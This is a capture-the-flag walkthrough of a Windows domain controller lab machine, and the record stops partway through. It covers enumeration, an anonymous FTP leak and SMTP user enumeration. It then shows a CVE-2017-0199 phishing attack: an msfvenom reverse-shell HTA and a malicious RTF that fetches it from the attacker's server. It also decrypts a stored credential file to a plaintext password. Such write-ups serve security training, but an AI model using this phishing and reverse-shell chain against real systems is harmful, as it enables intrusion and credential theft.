
Target : 10.129.20.161

Date : 12/06/2026

```bash
>  echo "10.129.20.161 reel.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.20.161 reel.htb  
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.20.161  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-12 15:16 +0200  
Nmap scan report for reel.htb (10.129.20.161)  
Host is up (0.056s latency).  
Not shown: 65527 filtered tcp ports (no-response)  
PORT      STATE SERVICE      VERSION  
21/tcp    open  ftp          Microsoft ftpd  
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)  
| ssh-hostkey:    
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)  
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)  
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)  
25/tcp    open  smtp?  
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP  
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY  
| fingerprint-strings:    
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:    
|     220 Mail Service ready  
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:    
|     220 Mail Service ready  
|     sequence of commands  
|     sequence of commands  
|   Hello:    
|     220 Mail Service ready  
|     EHLO Invalid domain address.  
|   Help:    
|     220 Mail Service ready  
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY  
|   SIPOptions:    
|     220 Mail Service ready  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|     sequence of commands  
|   TerminalServerCookie:    
|     220 Mail Service ready  
|_    sequence of commands  
135/tcp   open  msrpc        Microsoft Windows RPC  
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)  
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0  
49159/tcp open  msrpc        Microsoft Windows RPC  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
SF-Port25-TCP:V=7.99%I=7%D=6/12%Time=6A2C06D8%P=x86_64-pc-linux-gnu%r(NULL  
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S  
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%  
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH  
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"  
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s  
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r  
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20  
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\  
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x  
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command  
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad  
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma  
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer  
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq  
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2  
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20  
SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\  
SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero  
SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai  
SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re  
SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50  
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\  
SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")  
SF:%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindRe  
SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Ma  
SF:il\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n5  
SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of  
SF:\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\  
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman  
SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc  
SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\  
SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2  
SF:0commands\r\n");  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete  
No OS matches for host  
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.0.2:    
|_    Message signing enabled and required  
| smb-security-mode:    
|   account_used: <blank>  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: required  
|_clock-skew: mean: -19m59s, deviation: 34m36s, median: -1s  
| smb2-time:    
|   date: 2026-06-12T13:19:14  
|_  start_date: 2026-06-12T11:58:58  
| smb-os-discovery:    
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)  
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-  
|   Computer name: REEL  
|   NetBIOS computer name: REEL\x00  
|   Domain name: HTB.LOCAL  
|   Forest name: HTB.LOCAL  
|   FQDN: REEL.HTB.LOCAL  
|_  System time: 2026-06-12T14:19:15+01:00  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 234.85 seconds
```

This is quite the unusual `Active Directory`, we have several anomalies here, first, port `ftp 21/tcp` is open, and the port `25/tcp` `smtp?`  is flooded. We got the domain name and the Computer name, which we'll add to our hosts, otherwise, LDAP `389/tcp` is absent from the fullport scan but there is `LDAPBindReq;LDAPSearchReq` on port `25/tcp` which must be the entry point. We also have `ssh 22/tcp`, `RPC 135/tcp`, `NetBIOS 139/tcp` and `smb 3.0.2 445/tcp`.

`25/tcp` seems to be the biggest anomaly and `21/tcp` isn't there for no reason but we'll first check the samba shares with `netexec` and `guest` :

```bash
>  echo "10.129.20.161 REEL.HTB.LOCAL HTB.LOCAL" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.20.161 REEL.HTB.LOCAL HTB.LOCAL  
>  nxc smb 10.129.20.161 -u guest -p '' --shares  
SMB         10.129.20.161   445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)  
SMB         10.129.20.161   445    REEL             [-] HTB.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

And we got nothing.

We'll try connecting to `ftp` anonymously :

```bash
>  ftp -invp 10.129.20.161  
Connected to 10.129.20.161.  
220 Microsoft FTP Service  
Remote system type is Windows_NT.  
ftp> user ftp  
331 Anonymous access allowed, send identity (e-mail name) as password.  
Password:    
230 User logged in.  
ftp> ls  
227 Entering Passive Mode (10,129,20,161,160,40).  
125 Data connection already open; Transfer starting.  
05-29-18  12:19AM       <DIR>          documents  
226 Transfer complete.  
ftp> bye  
221 Goodbye.
```

Nothing interesting.

`25/tcp` is definitely the entry door here.

We'll first download the `/documents` from `ftp` :

```bash
>  mkdir -p /tmp/reel-ftp  
>  wget -r --no-passive-ftp -P /tmp/reel-ftp ftp://10.129.20.161/documents/  
--2026-06-12 15:33:27--  ftp://10.129.20.161/documents/  
          => ‘/tmp/reel-ftp/10.129.20.161/documents/.listing’  
Connecting to 10.129.20.161:21... connected.  
Logging in as anonymous ... Logged in!  
==> SYST ... done.    ==> PWD ... done.  
==> TYPE I ... done.  ==> CWD (1) /documents ... done.  
==> PORT ... done.    ==> LIST ... done.  
  
10.129.20.161/documents/.listing                         [ <=>                                                                                                                 ]     176  --.-KB/s    in 0s         
  
==> PORT ... done.    ==> LIST ... done.  
  
10.129.20.161/documents/.listing                         [ <=>                                                                                                                 ]     176  --.-KB/s    in 0.001s     
  
2026-06-12 15:33:28 (532 KB/s) - ‘/tmp/reel-ftp/10.129.20.161/documents/.listing’ saved [352]  
  
Removed ‘/tmp/reel-ftp/10.129.20.161/documents/.listing’.  
--2026-06-12 15:33:28--  ftp://10.129.20.161/documents/AppLocker.docx  
          => ‘/tmp/reel-ftp/10.129.20.161/documents/AppLocker.docx’  
==> CWD not required.  
==> PORT ... done.    ==> RETR AppLocker.docx ... done.  
Length: 2047 (2.0K)  
  
10.129.20.161/documents/AppLocker.docx               100%[====================================================================================================================>]   2.00K  --.-KB/s    in 0.01s      
  
2026-06-12 15:33:28 (203 KB/s) - ‘/tmp/reel-ftp/10.129.20.161/documents/AppLocker.docx’ saved [2047]  
  
--2026-06-12 15:33:28--  ftp://10.129.20.161/documents/readme.txt  
          => ‘/tmp/reel-ftp/10.129.20.161/documents/readme.txt’  
==> CWD not required.  
==> PORT ... done.    ==> RETR readme.txt ... done.  
Length: 124  
  
10.129.20.161/documents/readme.txt                   100%[====================================================================================================================>]     124  --.-KB/s    in 0s         
  
2026-06-12 15:33:28 (11.2 MB/s) - ‘/tmp/reel-ftp/10.129.20.161/documents/readme.txt’ saved [124]  
  
--2026-06-12 15:33:28--  ftp://10.129.20.161/documents/Windows%20Event%20Forwarding.docx  
          => ‘/tmp/reel-ftp/10.129.20.161/documents/Windows Event Forwarding.docx’  
==> CWD not required.  
==> PORT ... done.    ==> RETR Windows Event Forwarding.docx ... done.  
Length: 14581 (14K)  
  
10.129.20.161/documents/Windows Event Forwarding.doc 100%[====================================================================================================================>]  14.24K  --.-KB/s    in 0.06s      
  
2026-06-12 15:33:28 (220 KB/s) - ‘/tmp/reel-ftp/10.129.20.161/documents/Windows Event Forwarding.docx’ saved [14581]  
  
FINISHED --2026-06-12 15:33:28--  
Total wall clock time: 1.2s  
Downloaded: 3 files, 16K in 0.08s (217 KB/s)
```

Then use `exiftool` to see the `metadata` of the files :

```bash
>  exiftool /tmp/reel-ftp/**/*  
  
======== /tmp/reel-ftp/10.129.20.161/documents/Windows Event Forwarding.docx  
ExifTool Version Number         : 13.55  
File Name                       : Windows Event Forwarding.docx  
Directory                       : /tmp/reel-ftp/10.129.20.161/documents  
File Size                       : 15 kB  
File Modification Date/Time     : 2017:10:31 22:13:00+01:00  
File Access Date/Time           : 2026:06:12 15:33:28+02:00  
File Inode Change Date/Time     : 2026:06:12 15:33:28+02:00  
File Permissions                : -rw-r--r--  
Warning                         : Install Archive::Zip to decode compressed ZIP information  
File Type                       : ZIP  
File Type Extension             : zip  
MIME Type                       : application/zip  
Zip Required Version            : 20  
Zip Bit Flag                    : 0x0006  
Zip Compression                 : Deflated  
Zip Modify Date                 : 1980:01:01 00:00:00  
Zip CRC                         : 0x82872409  
Zip Compressed Size             : 385  
Zip Uncompressed Size           : 1422  
Zip File Name                   : [Content_Types].xml  
======== /tmp/reel-ftp/10.129.20.161/documents/readme.txt  
ExifTool Version Number         : 13.55  
File Name                       : readme.txt  
Directory                       : /tmp/reel-ftp/10.129.20.161/documents  
File Size                       : 124 bytes  
File Modification Date/Time     : 2018:05:28 14:01:00+02:00  
File Access Date/Time           : 2026:06:12 15:33:28+02:00  
File Inode Change Date/Time     : 2026:06:12 15:33:28+02:00  
File Permissions                : -rw-r--r--  
File Type                       : TXT  
File Type Extension             : txt  
MIME Type                       : text/plain  
MIME Encoding                   : us-ascii  
Newlines                        : Windows CRLF  
Line Count                      : 3  
Word Count                      : 21  
======== /tmp/reel-ftp/10.129.20.161/documents/AppLocker.docx  
ExifTool Version Number         : 13.55  
File Name                       : AppLocker.docx  
Directory                       : /tmp/reel-ftp/10.129.20.161/documents  
File Size                       : 2.0 kB  
File Modification Date/Time     : 2018:05:29 00:19:00+02:00  
File Access Date/Time           : 2026:06:12 15:33:28+02:00  
File Inode Change Date/Time     : 2026:06:12 15:33:28+02:00  
File Permissions                : -rw-r--r--  
Warning                         : Install Archive::Zip to decode compressed ZIP information  
File Type                       : ZIP  
File Type Extension             : zip  
MIME Type                       : application/zip  
Zip Required Version            : 20  
Zip Bit Flag                    : 0x0008  
Zip Compression                 : Deflated  
Zip Modify Date                 : 2018:05:29 00:19:50  
Zip CRC                         : 0x00000000  
Zip Compressed Size             : 0  
Zip Uncompressed Size           : 0  
Zip File Name                   : _rels/.rels  
======== /tmp/reel-ftp/10.129.20.161/documents/AppLocker.docx  
ExifTool Version Number         : 13.55  
File Name                       : AppLocker.docx  
Directory                       : /tmp/reel-ftp/10.129.20.161/documents  
File Size                       : 2.0 kB  
File Modification Date/Time     : 2018:05:29 00:19:00+02:00  
File Access Date/Time           : 2026:06:12 15:34:16+02:00  
File Inode Change Date/Time     : 2026:06:12 15:33:28+02:00  
File Permissions                : -rw-r--r--  
Warning                         : Install Archive::Zip to decode compressed ZIP information  
File Type                       : ZIP  
File Type Extension             : zip  
MIME Type                       : application/zip  
Zip Required Version            : 20  
Zip Bit Flag                    : 0x0008  
Zip Compression                 : Deflated  
Zip Modify Date                 : 2018:05:29 00:19:50  
Zip CRC                         : 0x00000000  
Zip Compressed Size             : 0  
Zip Uncompressed Size           : 0  
Zip File Name                   : _rels/.rels  
======== /tmp/reel-ftp/10.129.20.161/documents/readme.txt  
ExifTool Version Number         : 13.55  
File Name                       : readme.txt  
Directory                       : /tmp/reel-ftp/10.129.20.161/documents  
File Size                       : 124 bytes  
File Modification Date/Time     : 2018:05:28 14:01:00+02:00  
File Access Date/Time           : 2026:06:12 15:34:16+02:00  
File Inode Change Date/Time     : 2026:06:12 15:33:28+02:00  
File Permissions                : -rw-r--r--  
File Type                       : TXT  
File Type Extension             : txt  
MIME Type                       : text/plain  
MIME Encoding                   : us-ascii  
Newlines                        : Windows CRLF  
Line Count                      : 3  
Word Count                      : 21  
======== /tmp/reel-ftp/10.129.20.161/documents/Windows Event Forwarding.docx  
ExifTool Version Number         : 13.55  
File Name                       : Windows Event Forwarding.docx  
Directory                       : /tmp/reel-ftp/10.129.20.161/documents  
File Size                       : 15 kB  
File Modification Date/Time     : 2017:10:31 22:13:00+01:00  
File Access Date/Time           : 2026:06:12 15:34:16+02:00  
File Inode Change Date/Time     : 2026:06:12 15:33:28+02:00  
File Permissions                : -rw-r--r--  
Warning                         : Install Archive::Zip to decode compressed ZIP information  
File Type                       : ZIP  
File Type Extension             : zip  
MIME Type                       : application/zip  
Zip Required Version            : 20  
Zip Bit Flag                    : 0x0006  
Zip Compression                 : Deflated  
Zip Modify Date                 : 1980:01:01 00:00:00  
Zip CRC                         : 0x82872409  
Zip Compressed Size             : 385  
Zip Uncompressed Size           : 1422  
Zip File Name                   : [Content_Types].xml  
   2 directories scanned  
   6 image files read
```

We'll see what's in the `readme` :

```bash
>  cat /tmp/reel-ftp/10.129.20.161/documents/readme.txt  
  
please email me any rtf format procedures - I'll review and convert.  
  
new format / converted documents will be saved here.%
```

So the `Windows Event Forwarding.docx` must contain some `email` and the `AppLocker.docx` might contain information about security.

```bash
>  unzip -p /tmp/reel-ftp/10.129.20.161/documents/"Windows Event Forwarding.docx" docProps/core.xml | grep -E 'creator|lastModifiedBy|company|email' -i  
  
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http:/  
/purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:creator>nico@megabank.com</dc:creator><cp:revision>4</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2017-10-31T18:42:00  
Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2017-10-31T18:51:00Z</dcterms:modified></cp:coreProperties>
```

We have our first user : `nico@megabank.com` 

We check `AppLocker.docx` :

```bash
>  unzip -p /tmp/reel-ftp/10.129.20.161/documents/AppLocker.docx word/document.xml | sed 's/<[^>]*>//g' | tr -s ' \n'  
  
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.%
```

We'll enumerate users with `smtp-userenum` :

```bash
>  printf 'nico@megabank.com\nnico@reel.htb\nnico@htb.local\n' > /tmp/reel-smtp-users.txt  
smtp-user-enum -M RCPT -U /tmp/reel-smtp-users.txt -t 10.129.20.161  
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )  
  
----------------------------------------------------------  
|                   Scan Information                       |  
----------------------------------------------------------  
  
Mode ..................... RCPT  
Worker Processes ......... 5  
Usernames file ........... /tmp/reel-smtp-users.txt  
Target count ............. 1  
Username count ........... 3  
Target TCP port .......... 25  
Query timeout ............ 5 secs  
Target domain ............    
  
######## Scan started at Fri Jun 12 15:46:25 2026 #########  
10.129.20.161: nico@reel.htb exists  
10.129.20.161: nico@megabank.com exists  
10.129.20.161: nico@htb.local exists  
######## Scan completed at Fri Jun 12 15:46:26 2026 #########  
3 results.  
  
3 queries in 1 seconds (3.0 queries / sec)
>  cat /tmp/reel-smtp-users.txt  
nico@megabank.com  
nico@reel.htb  
nico@htb.local
```

So we have three different `nico` addresses. One corresponding to the DC.

We'll have to `phish` the email `nico@megabank.com` using an `rtf` per the `rtf format procedures`.

We'll use `CVE-2017-0199` which allows `RCE` from sending a malicious `Microsoft Excel` file to our target.

We open a http webserver leading to us :

```bash
>  python3 -m http.server 9000 --bind 10.10.14.228  
  
Serving HTTP on 10.10.14.228 port 9000 (http://10.10.14.228:9000/) ...
```

And a listener :

```bash
>  nc -lvnp 4444 -s 10.10.14.228  
  
Listening on 10.10.14.228 4444
```

We then create our payload `msfv.hta` that allows for `Remote Code Execution` over the `http server` we created :

```bash
>  mkdir -p /tmp/reel  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.228 LPORT=4444 -f hta-psh -o /tmp/reel/msfv.hta  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x86 from the payload  
No encoder specified, outputting raw payload  
Payload size: 324 bytes  
Final size of hta-psh file: 7342 bytes  
Saved as: /tmp/reel/msfv.hta
```

And we create a `.rtf` document that makes the target automatically fetch our payload :

```bash
>  python2 /tmp/CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w /tmp/reel/procedure.rtf -u http://10.10.14.228:9000/msfv.hta -t rtf -x 0  
  
Generating normal RTF payload.  
  
Generated /tmp/reel/procedure.rtf successfully
```

We're ready to phish.

```bash
>  nc -lvnp 4444 -s 10.10.14.228  
  
Listening on 10.10.14.228 4444  
Connection received on 10.129.20.161 50608  
Microsoft Windows [Version 6.3.9600]  
(c) 2013 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>
```

And `nico` bit unusually fast.

```PowerShell
C:\Windows\System32>type C:\Users\nico\Desktop\user.txt  
type C:\Users\nico\Desktop\user.txt  
81ea3*******************6cd09
```

We got the user flag.

```PowerShell
C:\Windows\System32>whoami  
whoami  
htb\nico  
  
C:\Windows\System32>whoami /priv  
whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State      
============================= ============================== ========  
SeShutdownPrivilege           Shut down the system           Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled  
  
C:\Windows\System32>whoami /groups    
whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                 Type             SID                                            Attributes                                           
========================================== ================ ============================================== ==================================================  
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group  
BUILTIN\Performance Monitor Users          Alias            S-1-5-32-558                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Group used for deny only                             
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                             
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group  
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group  
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group  
HTB\AppLocker_Test                         Group            S-1-5-21-2648318136-3688571242-2924127574-1138 Mandatory group, Enabled by default, Enabled group  
HTB\MegaBank_Users                         Group            S-1-5-21-2648318136-3688571242-2924127574-1604 Mandatory group, Enabled by default, Enabled group  
HTB\DR_Site                                Group            S-1-5-21-2648318136-3688571242-2924127574-1143 Mandatory group, Enabled by default, Enabled group  
HTB\HelpDesk_Admins                        Group            S-1-5-21-2648318136-3688571242-2924127574-1145 Mandatory group, Enabled by default, Enabled group  
HTB\Restrictions                           Group            S-1-5-21-2648318136-3688571242-2924127574-1146 Mandatory group, Enabled by default, Enabled group  
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

C:\Users\nico\Desktop>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is CEBA-B613  

C:\Windows\System32>cd /Users/nico/Desktop  
cd /Users/nico/Desktop

Directory of C:\Users\nico\Desktop  
  
28/05/2018  21:07    <DIR>          .  
28/05/2018  21:07    <DIR>          ..  
28/10/2017  00:59             1,468 cred.xml  
12/06/2026  13:00                34 user.txt  
              2 File(s)          1,502 bytes  
              2 Dir(s)   4,982,575,104 bytes free  
  
C:\Users\nico\Desktop>type cred.xml  
type cred.xml  
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">  
 <Obj RefId="0">  
   <TN RefId="0">  
     <T>System.Management.Automation.PSCredential</T>  
     <T>System.Object</T>  
   </TN>  
   <ToString>System.Management.Automation.PSCredential</ToString>  
   <Props>  
     <S N="UserName">HTB\Tom</S>  
     <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000  
065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>  
   </Props>  
 </Obj>  
</Objs>
```

We got `Tom`'s information in a `xml` file, but we need to decrypt the password string :

```PowerShell
C:\Users\nico\Desktop>powershell -nop -c "$c=Import-Clixml -Path C:\Users\nico\Desktop\cred.xml; $c.GetNetworkCredential().UserName; $c.GetNetworkCredential().Password"  
powershell -nop -c "$c=Import-Clixml -Path C:\Users\nico\Desktop\cred.xml; $c.GetNetworkCredential().UserName; $c.GetNetworkCredential().Password"  
  
Tom  
1ts-mag1c!!!
```

And here we have it : `Tom:1ts!mag1c!!!`

We `ssh` in :

```PowerShell
>  ssh tom@10.129.20.161  
The authenticity of host '10.129.20.161 (10.129.20.161)' can't be established.  
ED25519 key fingerprint is: SHA256:fIZnS9nEVF3o86fEm/EKspTgedBr8TvFR0i3Pzk40EQ  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.129.20.161' (ED25519) to the list of known hosts.  
Microsoft Windows [Version 6.3.9600]                                                                                               
(c) 2013 Microsoft Corporation. All rights reserved.                                                                               
  
tom@REEL C:\Users\tom>cd /Users

tom@REEL C:\Users>dir                                                                                                              
Volume in drive C has no label.                                                                                                   
Volume Serial Number is CEBA-B613                                                                                                 
  
Directory of C:\Users                                                                                                             
  
11/04/2017  12:09 AM    <DIR>          .                                                                                           
11/04/2017  12:09 AM    <DIR>          ..                                                                                          
10/25/2017  09:48 PM    <DIR>          .NET v2.0                                                                                   
10/25/2017  09:48 PM    <DIR>          .NET v2.0 Classic                                                                           
11/01/2017  10:58 PM    <DIR>          .NET v4.5                                                                                   
11/01/2017  10:58 PM    <DIR>          .NET v4.5 Classic                                                                           
02/17/2018  12:29 AM    <DIR>          Administrator                                                                               
11/05/2017  12:05 AM    <DIR>          brad                                                                                        
10/31/2017  12:00 AM    <DIR>          claire                                                                                      
10/25/2017  09:48 PM    <DIR>          Classic .NET AppPool                                                                        
11/04/2017  12:09 AM    <DIR>          herman                                                                                      
10/31/2017  11:27 PM    <DIR>          julia                                                                                       
05/29/2018  11:37 PM    <DIR>          nico                                                                                        
08/22/2013  04:39 PM    <DIR>          Public                                                                                      
10/28/2017  10:32 PM    <DIR>          SSHD                                                                                        
11/16/2017  11:35 PM    <DIR>          tom                                                                                         
              0 File(s)              0 bytes                                                                                      
             16 Dir(s)   4,982,509,568 bytes free
```

We got a bunch of users. And we're in `REEL`.

```PowerShell
tom@REEL C:\Users>whoami /priv                                                                                                     
  
PRIVILEGES INFORMATION                                                                                                             
----------------------                                                                                                             
  
Privilege Name                Description                    State                                                                 
============================= ============================== =======                                                               
SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                               
SeLoadDriverPrivilege         Load and unload device drivers Enabled                                                               
SeShutdownPrivilege           Shut down the system           Enabled                                                               
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                               
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                                                               
  
tom@REEL C:\Users>whoami /groups                                                                                                   
  
GROUP INFORMATION                                                                                                                  
-----------------                                                                                                                  
  
Group Name                                 Type             SID                                            Attributes              
                                                                                                                                  
========================================== ================ ============================================== =====================  
=============================                                                                                                      
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enab  
led by default, Enabled group                                                                                                      
BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enab  
led by default, Enabled group                                                                                                      
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enab  
led by default, Enabled group                                                                                                      
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enab  
led by default, Enabled group                                                                                                      
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enab  
led by default, Enabled group                                                                                                      
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enab  
led by default, Enabled group                                                                                                      
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enab  
led by default, Enabled group                                                                                                      
HTB\SharePoint_Admins                      Group            S-1-5-21-2648318136-3688571242-2924127574-1142 Mandatory group, Enab  
led by default, Enabled group                                                                                                      
HTB\MegaBank_Users                         Group            S-1-5-21-2648318136-3688571242-2924127574-1604 Mandatory group, Enab  
led by default, Enabled group                                                                                                      
HTB\DR_Site                                Group            S-1-5-21-2648318136-3688571242-2924127574-1143 Mandatory group, Enab  
led by default, Enabled group                                                                                                      
HTB\HelpDesk_Admins                        Group            S-1-5-21-2648318136-3688571242-2924127574-1145 Mandatory group, Enab  
led by default, Enabled group                                                                                                      
HTB\Restrictions                           Group            S-1-5-21-2648318136-3688571242-2924127574-1146 Mandatory group, Enab  
led by default, Enabled group                                                                                                      
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enab  
led by default, Enabled group                                                                                                      
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

tom@REEL C:\Users>cd tom



tom@REEL C:\Users\tom>cd Desktop                                                                                                   
  
tom@REEL C:\Users\tom\Desktop>dir                                                                                                  
Volume in drive C has no label.                                                                                                   
Volume Serial Number is CEBA-B613                                                                                                 
  
Directory of C:\Users\tom\Desktop                                                                                                 
  
05/29/2018  08:57 PM    <DIR>          .                                                                                           
05/29/2018  08:57 PM    <DIR>          ..                                                                                          
05/29/2018  09:02 PM    <DIR>          AD Audit                                                                                    
              0 File(s)              0 bytes                                                                                      
              3 Dir(s)   4,982,509,568 bytes free                                                                                 
  
tom@REEL C:\Users\tom\Desktop>cd "AD Audit"                                                                                        
  
tom@REEL C:\Users\tom\Desktop\AD Audit>dir                                                                                         
Volume in drive C has no label.                                                                                                   
Volume Serial Number is CEBA-B613                                                                                                 
  
Directory of C:\Users\tom\Desktop\AD Audit                                                                                        
  
05/29/2018  09:02 PM    <DIR>          .                                                                                           
